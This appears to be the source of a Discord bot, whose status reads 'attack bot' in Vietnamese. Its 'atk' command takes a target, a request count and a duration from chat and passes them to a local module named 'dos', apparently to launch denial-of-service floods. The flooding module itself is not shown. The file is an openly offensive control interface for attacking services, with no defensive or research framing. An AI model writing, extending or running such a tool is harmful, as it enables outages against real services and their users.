const Discord = require('discord.js');
const client = new Discord.Client();
const request = require('request');
const auth = require('./auth.json');

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
	client.user.setPresence({
        status: "online",
        game: {
            name: "Bot tấn công",
            type: "STREAMING"
        }
    }); 
});


client.on('message', message => {

if (message.author.bot) return;
const prefix = auth.prefix;
if (message.content.startsWith(prefix)) {
	
	const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const command = args.shift().toLowerCase();
	
	if (command === 'atk') {
		var arr = message.content.split(" ");
		var target = arr[1];
		var req = arr[2];
		var time = arr[4];
		const dos = require('./bin');

		dos(target, req, time);
	}
	if(command === 'ping') {
		message.channel.send('Pong!')
	}
}
})

client.login(auth.token)